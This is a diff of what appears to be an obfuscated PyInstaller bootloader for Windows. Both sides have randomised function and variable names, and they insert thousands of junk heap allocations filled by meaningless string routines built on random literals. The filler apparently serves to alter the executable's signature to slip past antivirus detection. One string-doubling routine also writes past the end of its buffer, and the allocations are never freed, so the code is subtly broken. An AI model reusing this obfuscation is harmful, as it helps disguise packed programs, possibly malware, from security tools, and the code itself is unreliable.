-if (gWVJeVhOaCnXR(hjmTBMu, argc, argv)) return -1;
-if (ojZdxcSb(hjmTBMu)) return -1;
-if (DcBDCvzXzHz(hjmTBMu)) return -1;
-VQiKEQBn = hfPKSje(hjmTBMu);
-return VQiKEQBn; }
-void UJyEzJgrrqmlOve(const char *iUJgTXHnToXK);
-void FGhZEgTpq(char *YewnfndopHUkRpd, int Cmkggi, struct _finddata_t GXAFIhfDuEwD) {
-if ( strcmp(GXAFIhfDuEwD.name, ".")==0  || strcmp(GXAFIhfDuEwD.name, "..") == 0 ) return;
-YewnfndopHUkRpd[Cmkggi] = '\0';
-strcat(YewnfndopHUkRpd, GXAFIhfDuEwD.name);
-if ( GXAFIhfDuEwD.attrib & _A_SUBDIR ) UJyEzJgrrqmlOve(YewnfndopHUkRpd);
- else if (remove(YewnfndopHUkRpd)) { Sleep(100); remove(YewnfndopHUkRpd); } }
-void UJyEzJgrrqmlOve(const char *XogVDKD) {
-char LEOVCkdrEwqc[_MAX_PATH+1]; struct _finddata_t ukldDcYzYqlaTKT;
-long kODIuSUc; int tBjNDHOomd; strcpy(LEOVCkdrEwqc, XogVDKD);
-tBjNDHOomd = strlen(LEOVCkdrEwqc);
-if ( LEOVCkdrEwqc[tBjNDHOomd-1] != '/' && LEOVCkdrEwqc[tBjNDHOomd-1] != '\\' ) { strcat(LEOVCkdrEwqc, "\\"); tBjNDHOomd++; }
-strcat(LEOVCkdrEwqc, "*");
-kODIuSUc = _findfirst(LEOVCkdrEwqc, &ukldDcYzYqlaTKT);
-if (kODIuSUc != -1) {
-    FGhZEgTpq(LEOVCkdrEwqc, tBjNDHOomd, ukldDcYzYqlaTKT);
-    while ( _findnext(kODIuSUc, &ukldDcYzYqlaTKT) == 0 ) FGhZEgTpq(LEOVCkdrEwqc, tBjNDHOomd, ukldDcYzYqlaTKT);
-    _findclose(kODIuSUc); }
-rmdir(XogVDKD); }
-void SOTaVefTGFLa(ARCHIVE_STATUS *lcGbYUtbSwyQmQ) { if (lcGbYUtbSwyQmQ->temppath[0]) UJyEzJgrrqmlOve(lcGbYUtbSwyQmQ->temppath); }
-int CnrzJXw(ARCHIVE_STATUS *HKDCvkRLFQA) { return ntohl(HKDCvkRLFQA->cookie.pyvers); }
-void vEtsPGVkTsmxCQ(void) { PI_Py_Finalize(); } 
-char* LGKXcv(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
-char* OyHxpZdUJvRrz(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
-char* GrBOvAdrR(){ char cnHViiJq[8931], jdIYDtHVfkiX[8931/2]; strcpy(cnHViiJq,"BmwhMlxMXSMgywfCAlmKrlNRpCWkRlfyHbVjxsjFWEReDKAcoF"); strcpy(jdIYDtHVfkiX,"wEpuYVdhsbGWOpmmyUNHWjLXYbKRPLSXlfzqezeYhQWuxajSCg"); return OyHxpZdUJvRrz(strcat( cnHViiJq, jdIYDtHVfkiX)); }
-char* lvoMvTmsxAJ() { char iRjmXUxELKW[8931] = "YhazVQvAZtVqfaJEVAWooWZwjEBWhSiWhYvnYfYVRpIykwGlhj"; char *ATGopTxaArj = strupr(iRjmXUxELKW); return strlwr(ATGopTxaArj); }
-char* iWcNMUWnGJT(){ char *eGJFOonS = LGKXcv("dBRhZPptZUcDTeLuzdTRVDEcLHcbYQHUXxcQVFuQmjdNbTuLjq"); return strstr( eGJFOonS, "H" );}
-int APIENTRY WinMain( HINSTANCE IgyiLP, HINSTANCE SDlUvJcpwfFBSnx, LPSTR CCMTpiCniSoKI, int bufxhSHlEDUS ) {
-char PgfyRRcDMJch[_MAX_PATH + 5];
-char* mRtVojhjp[2247];
-char **argv = __argv;
-char* TaMvGMwggxdmjv[7830];
-char* GUsEurngGC[4349];
-char *WQoOFHqJoHrfE = NULL;
-int i = 0;
-WCHAR OznViRYNKgjeZ[_MAX_PATH + 1];
-int argc = __argc;
-int LrTYVwtmzPDJa = 0;
-ARCHIVE_STATUS *uHJxCMVSelac[20];
-char okaUzk[_MAX_PATH];
+int BHbyyDe(ARCHIVE_STATUS *JvMVyVgoYeZ, int argc, char *argv[]) {
+int MZGXevIFblL = 0;
+if (DOaCRqBZKiYumv(JvMVyVgoYeZ)) return -1;
+if (kNTpLDYoKCw(JvMVyVgoYeZ, argc, argv)) return -1;
+if (HdPmDvVVxEsKom(JvMVyVgoYeZ)) return -1;
+if (ZoJMtJHFzYkkW(JvMVyVgoYeZ)) return -1;
+MZGXevIFblL = HZWOOvAo(JvMVyVgoYeZ);
+return MZGXevIFblL; }
+void JlmqoR(const char *TjeOwhfhVIEJwc);
+void ObqwRSNPLiY(char *uskeNzJfZNpqehc, int FBDlnuJSGYlcQd, struct _finddata_t WpivrLzXck) {
+if ( strcmp(WpivrLzXck.name, ".")==0  || strcmp(WpivrLzXck.name, "..") == 0 ) return;
+uskeNzJfZNpqehc[FBDlnuJSGYlcQd] = '\0';
+strcat(uskeNzJfZNpqehc, WpivrLzXck.name);
+if ( WpivrLzXck.attrib & _A_SUBDIR ) JlmqoR(uskeNzJfZNpqehc);
+ else if (remove(uskeNzJfZNpqehc)) { Sleep(100); remove(uskeNzJfZNpqehc); } }
+void JlmqoR(const char *nfgrpEL) {
+char jnfbjonwNwbkcba[_MAX_PATH+1]; struct _finddata_t NquzeNKtjmWfxsT;
+long ZCaYoZnEEWD; int KMHrmATivgVCs; strcpy(jnfbjonwNwbkcba, nfgrpEL);
+KMHrmATivgVCs = strlen(jnfbjonwNwbkcba);
+if ( jnfbjonwNwbkcba[KMHrmATivgVCs-1] != '/' && jnfbjonwNwbkcba[KMHrmATivgVCs-1] != '\\' ) { strcat(jnfbjonwNwbkcba, "\\"); KMHrmATivgVCs++; }
+strcat(jnfbjonwNwbkcba, "*");
+ZCaYoZnEEWD = _findfirst(jnfbjonwNwbkcba, &NquzeNKtjmWfxsT);
+if (ZCaYoZnEEWD != -1) {
+    ObqwRSNPLiY(jnfbjonwNwbkcba, KMHrmATivgVCs, NquzeNKtjmWfxsT);
+    while ( _findnext(ZCaYoZnEEWD, &NquzeNKtjmWfxsT) == 0 ) ObqwRSNPLiY(jnfbjonwNwbkcba, KMHrmATivgVCs, NquzeNKtjmWfxsT);
+    _findclose(ZCaYoZnEEWD); }
+rmdir(nfgrpEL); }
+void aVWIXVZ(ARCHIVE_STATUS *DTXUnf) { if (DTXUnf->temppath[0]) JlmqoR(DTXUnf->temppath); }
+int aJYNvnshnpHSQgm(ARCHIVE_STATUS *hWVMmDhVVmjpjv) { return ntohl(hWVMmDhVVmjpjv->cookie.pyvers); }
+void WowgHWrzEQiPD(void) { PI_Py_Finalize(); } 
+char* zgvvssL(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
+char* pAcOVxjdsrfmcHe(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
+char* gRWlnlyqINfAA(){ char *LMwrutnM = zgvvssL("EDAQMEAZaJnOrSxBmnroYlHPekbvNMmiIUdgArVSGWxWDFzHSQ"); return strstr( LMwrutnM, "k" );}
+char* IlHsQmGZJCqQr(){ char jAMKFNfOzGb[882], YNIUFxIsqkZa[882/2]; strcpy(jAMKFNfOzGb,"ZEVqyFKIEJmFsxwMqYJdNxSokdebvxMtTERKhPPMqsdBXVCZbt"); strcpy(YNIUFxIsqkZa,"tYkaQNKLARLsObPlLAVJripmxepUzFZAuxfZDibmNvrRxwOpVU"); return pAcOVxjdsrfmcHe(strcat( jAMKFNfOzGb, YNIUFxIsqkZa)); }
+char* YZeXfWodOrPPoX() { char zruIiViBYFcbs[882] = "bfirDsdDeVdXXPPkmRknrNkXVKitnoyngqDayRSuzArEHMrdca"; char *LjhFNjgpyXHopSw = strupr(zruIiViBYFcbs); return strlwr(LjhFNjgpyXHopSw); }
+int APIENTRY WinMain( HINSTANCE qwAMqYToSd, HINSTANCE hgfZgyuzBHvrsm, LPSTR fmMckfG, int CZIsrY ) {
+char lYLLjxvBtIw[_MAX_PATH];
+ARCHIVE_STATUS *feXuRQPtatXpwV[20];
+char* euyfDU[7463];
+char* KRZIdoT[6669];
+WCHAR HGbOCvCbb[_MAX_PATH + 1];
+int pYzcNzZwrVTCOWT = 0;
+char JYWNcMEWEaBln[_MAX_PATH];
 char MEIPASS2[_MAX_PATH + 11] = "_MEIPASS2=";
-char OJpJTsdRiXSgVA[_MAX_PATH];
-memset(&uHJxCMVSelac, 0, 20 * sizeof(ARCHIVE_STATUS *));
-for (i = 0;  i < 2247;  ++i) mRtVojhjp[i] = malloc (8931);if ((uHJxCMVSelac[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }
-JVCyONZgQ(okaUzk, argv[0]);
-IuLLLcULmVX(OznViRYNKgjeZ);
-for (i = 0;  i < 7830;  ++i) TaMvGMwggxdmjv[i] = malloc (9168);DKKeJygLDad(PgfyRRcDMJch, okaUzk);
-MVzPDdJSZh(OJpJTsdRiXSgVA, okaUzk);
-for (i = 0;  i < 4349;  ++i) GUsEurngGC[i] = malloc (9584);WQoOFHqJoHrfE = getenv( "_MEIPASS2" );
-if (WQoOFHqJoHrfE && *WQoOFHqJoHrfE == 0) { WQoOFHqJoHrfE = NULL; }
-if (dRPpamEhMrcHR(uHJxCMVSelac[SELF], OJpJTsdRiXSgVA, &okaUzk[strlen(OJpJTsdRiXSgVA)])) {
-    if (dRPpamEhMrcHR(uHJxCMVSelac[SELF], OJpJTsdRiXSgVA, &PgfyRRcDMJch[strlen(OJpJTsdRiXSgVA)])) { return -1; } }
-if (!WQoOFHqJoHrfE && !CxMFOmAYcNx(uHJxCMVSelac)) {
-    WQoOFHqJoHrfE = OJpJTsdRiXSgVA;
-    strcat(MEIPASS2, OJpJTsdRiXSgVA);
+int argc = __argc;
+char **argv = __argv;
+char GcytIRZyPsG[_MAX_PATH + 5];
+char *RlrTUreqBkowaU = NULL;
+int i = 0;
+char* DVWpbtJJG[1055];
+memset(&feXuRQPtatXpwV, 0, 20 * sizeof(ARCHIVE_STATUS *));
+for (i = 0;  i < 1055;  ++i) DVWpbtJJG[i] = malloc (4574);if ((feXuRQPtatXpwV[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }
+RidfxdEzSBmfi(lYLLjxvBtIw, argv[0]);
+hwMDZBvnCF(HGbOCvCbb);
+for (i = 0;  i < 6669;  ++i) KRZIdoT[i] = malloc (6878);oanKnOIhpasN(GcytIRZyPsG, lYLLjxvBtIw);
+KNASQRIRQMV(JYWNcMEWEaBln, lYLLjxvBtIw);
+for (i = 0;  i < 7463;  ++i) euyfDU[i] = malloc (7157);RlrTUreqBkowaU = getenv( "_MEIPASS2" );
+if (RlrTUreqBkowaU && *RlrTUreqBkowaU == 0) { RlrTUreqBkowaU = NULL; }
+if (VoIWYKYKccMMTqo(feXuRQPtatXpwV[SELF], JYWNcMEWEaBln, &lYLLjxvBtIw[strlen(JYWNcMEWEaBln)])) {
+    if (VoIWYKYKccMMTqo(feXuRQPtatXpwV[SELF], JYWNcMEWEaBln, &GcytIRZyPsG[strlen(JYWNcMEWEaBln)])) { return -1; } }
+if (!RlrTUreqBkowaU && !vRQebKCCRrnDGe(feXuRQPtatXpwV)) {
+    RlrTUreqBkowaU = JYWNcMEWEaBln;
+    strcat(MEIPASS2, JYWNcMEWEaBln);
     putenv(MEIPASS2); }
-if (WQoOFHqJoHrfE) {
-    if (strcmp(OJpJTsdRiXSgVA, WQoOFHqJoHrfE) != 0) {
-        strcpy(uHJxCMVSelac[SELF]->temppath, WQoOFHqJoHrfE);
-        strcpy(uHJxCMVSelac[SELF]->temppathraw, WQoOFHqJoHrfE); }
-    APVPgiK(WQoOFHqJoHrfE, okaUzk);
-for (i=0; i<2247; ++i){strcpy(mRtVojhjp[i], GrBOvAdrR());}    LrTYVwtmzPDJa = Eezpizy(uHJxCMVSelac[SELF], argc, argv);
-    pfMCjgKdOujxkxR();
-    vEtsPGVkTsmxCQ();
+if (RlrTUreqBkowaU) {
+    if (strcmp(JYWNcMEWEaBln, RlrTUreqBkowaU) != 0) {
+        strcpy(feXuRQPtatXpwV[SELF]->temppath, RlrTUreqBkowaU);
+        strcpy(feXuRQPtatXpwV[SELF]->temppathraw, RlrTUreqBkowaU); }
+    kpLoRqP(RlrTUreqBkowaU, lYLLjxvBtIw);
+for (i=0; i<1055; ++i){strcpy(DVWpbtJJG[i], gRWlnlyqINfAA());}    pYzcNzZwrVTCOWT = BHbyyDe(feXuRQPtatXpwV[SELF], argc, argv);
+    ochkoBHcUdis();
+    WowgHWrzEQiPD();
 } else { 
-    if (WcDOapvnLPszOZh(uHJxCMVSelac)) { return -1; }
-for (i=0; i<7830; ++i){strcpy(TaMvGMwggxdmjv[i], lvoMvTmsxAJ());}    strcat(MEIPASS2, uHJxCMVSelac[SELF]->temppath[0] != 0 ? uHJxCMVSelac[SELF]->temppath : OJpJTsdRiXSgVA);
+    if (pbtRZQU(feXuRQPtatXpwV)) { return -1; }
+for (i=0; i<6669; ++i){strcpy(KRZIdoT[i], IlHsQmGZJCqQr());}    strcat(MEIPASS2, feXuRQPtatXpwV[SELF]->temppath[0] != 0 ? feXuRQPtatXpwV[SELF]->temppath : JYWNcMEWEaBln);
     putenv(MEIPASS2);
-    if (cOkGOydsmgDQ(uHJxCMVSelac[SELF]) == -1) return -1;
-    LrTYVwtmzPDJa = RMZiMs(OznViRYNKgjeZ);
-    if (uHJxCMVSelac[SELF]->temppath[0] != 0) UJyEzJgrrqmlOve(uHJxCMVSelac[SELF]->temppath);
-    for (i = SELF; uHJxCMVSelac[i] != NULL; i++) { free(uHJxCMVSelac[i]); }}
-for (i=0; i<4349; ++i){strcpy(GUsEurngGC[i], iWcNMUWnGJT());}return LrTYVwtmzPDJa; }
+    if (potbFMUVCZ(feXuRQPtatXpwV[SELF]) == -1) return -1;
+    pYzcNzZwrVTCOWT = XXuuqhTytW(HGbOCvCbb);
+    if (feXuRQPtatXpwV[SELF]->temppath[0] != 0) JlmqoR(feXuRQPtatXpwV[SELF]->temppath);
+    for (i = SELF; feXuRQPtatXpwV[i] != NULL; i++) { free(feXuRQPtatXpwV[i]); }}
+for (i=0; i<7463; ++i){strcpy(euyfDU[i], YZeXfWodOrPPoX());}return pYzcNzZwrVTCOWT; }
